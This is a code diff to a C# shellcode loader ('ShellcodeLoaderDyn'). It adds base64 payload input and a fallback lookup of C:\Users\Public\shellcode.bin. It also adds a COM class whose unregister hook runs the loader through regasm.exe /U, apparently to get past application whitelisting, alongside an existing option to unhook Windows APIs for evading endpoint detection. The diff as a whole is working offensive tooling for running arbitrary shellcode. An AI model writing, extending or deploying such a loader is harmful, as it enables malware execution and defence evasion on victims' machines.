@@ -6,6 +6,8 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using DI = XYZ.DI;
+using System.EnterpriseServices;
+
 namespace ShellcodeLoaderDyn
 {
     public class Delegates
@@ -1189,27 +1191,34 @@ namespace ShellcodeLoaderDyn
         public static void usage()
         {
             StringBuilder sb = new StringBuilder();
-            sb.AppendLine("Usage: ShellcodeLoader.exe [-u] [-p password] [shellcode_file]");
+            sb.AppendLine("Usage: ShellcodeLoader.exe [--no-unhook] [-p password] [shellcode_file|--base64 base64_shellcode]");
             sb.AppendLine("\tshellcode_file\tfile containing the shellcode");
-            sb.AppendLine("If <shellcode> is not specified, the program will search for \"shellcode.bin\" the current working directory.");
-            sb.AppendLine("\t-p password\tif a password is required for the key, it will be read from this parameter instead of asking interactively");
-            sb.AppendLine("\t-u\tDON'T UNHOOK API before loading the shellcode");
+            sb.AppendLine("\base64_shellcode\tshellcode in base64 format");
+            sb.AppendLine("If <shellcode_file> is not specified, the program will search for \"shellcode.bin\" the current working directory and then in C:\\Users\\Public.");
+            sb.AppendLine("\t-p password\t[TEMPORARILY DISABLED] if a password is required for the key, it will be read from this parameter instead of asking interactively");
+            sb.AppendLine("\t--no-unhook\tDON'T UNHOOK API before loading the shellcode");
+            sb.AppendLine("\t--base64\tThe positional argument is directly the shellcode in base64 format.");
+            sb.AppendLine("\nREGASM Mode:");
+            sb.AppendLine("Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U ShellcodeLoader.exe [--no-unhook] [--file=shellcode_file|--base64=base64_shellcode]");
             Console.WriteLine(sb.ToString());
         }
-
 
         public static int Main(string[] args)
         {
             // PARAMS
-            string filename = null;
+            string filename_or_base64 = null;
             string password = null;
+            bool isbase64 = false;
 
             for (int i = 0; i < args.Length; i++)
             {
                 switch (args[i])
                 {
-                    case "-u":
+                    case "--no-unhook":
                         Program.unhook = false;
+                        break;
+                    case "--base64":
+                        isbase64 = true;
                         break;
                     case "-p":
                         if (i + 1 >= args.Length)
@@ -1221,9 +1230,9 @@ namespace ShellcodeLoaderDyn
                         i++;
                         break;
                     default:
-                        if (filename == null)
+                        if (filename_or_base64 == null)
                         {
-                            filename = args[i];
+                            filename_or_base64 = args[i];
                         }
                         else
                         {
@@ -1234,39 +1243,55 @@ namespace ShellcodeLoaderDyn
                 }
             }
 
-            if (filename == null)
+            if (isbase64)
             {
-                if (File.Exists("shellcode.bin"))
+                if (filename_or_base64 == null)
                 {
-                    filename = "shellcode.bin";
+                    Console.Error.WriteLine("You have used the --base64 flag without specifying the base64 shellcode");
+                    return -3;
                 }
-                else
+                return GoB64(filename_or_base64);
+            }
+            else
+            {
+                string filename = filename_or_base64;
+                if (filename == null)
                 {
-                    Console.Error.WriteLine("Please specify an input filename");
-                    usage();
-                    return 0;
+                    if (File.Exists("shellcode.bin"))
+                    {
+                        filename = "shellcode.bin";
+                    }
+                    else if (File.Exists("C:\\Users\\Public\\shellcode.bin"))
+                    {
+                        filename = "C:\\Users\\Public\\shellcode.bin";
+                    }
+                    else
+                    {
+                        Console.Error.WriteLine("Please specify an input filename");
+                        usage();
+                        return 0;
+                    }
                 }
-            }
+                if (!File.Exists(filename))
+                {
+                    Console.Error.WriteLine("Specified filename does not exist: " + filename);
+                    return -1;
+                }
 
-            if (!File.Exists(filename))
-            {
-                Console.Error.WriteLine("Specified filename does not exist: " + filename);
-                return -1;
+                // Load shellcode from file
+                byte[] rawcontent;
+                try
+                {
+                    rawcontent = File.ReadAllBytes(filename);
+                }
+                catch (Exception e)
+                {
+                    Console.Error.WriteLine("Unreadable shellcode file.");
+                    Console.Error.WriteLine(e.Message);
+                    return -2;
+                }
+                return Go(rawcontent);
             }
-
-            // Load shellcode from file
-            byte[] rawcontent;
-            try
-            {
-                rawcontent = File.ReadAllBytes(filename);
-            }
-            catch (Exception e)
-            {
-                Console.Error.WriteLine("Unreadable shellcode file.");
-                Console.Error.WriteLine(e.Message);
-                return -2;
-            }
-            return Go(rawcontent);
         }
         public static int GoB64(string payload)
         {
@@ -1372,6 +1397,37 @@ namespace ShellcodeLoaderDyn
             DI.Generic.DynamicAPIInvoke("kernel32.dll", "WaitForSingleObject", typeof(Delegates.WaitForSingleObject), ref wait_parameters);
             Console.WriteLine("DONE!");
             return 0;
+        }
+    }
+
+    public class RegLoader : ServicedComponent
+    {
+        public RegLoader() { Console.WriteLine("I am a basic COM Object"); }
+
+        [ComUnregisterFunction]
+        public static void UnRegisterClass(string key)
+        {
+            Console.WriteLine("RegAsm loading mode engaged");
+            List<string> args = new List<string>();
+            foreach (string arg in Environment.GetCommandLineArgs())
+            {
+                switch (arg.Split('=')[0]) {
+                    case "--no-unhook":
+                        args.Add(arg.Split('=')[0]);
+                        break;
+                    case "--file":
+                        args.Add(arg.Split('=')[1]);
+                        break;
+                    case "--base64":
+                        args.Add("--base64");
+                        args.Add(arg.Split('=')[1]);
+                        break;
+                    default:
+                        break;
+                }
+            }
+
+            Program.Main(args.ToArray());
         }
     }
 }
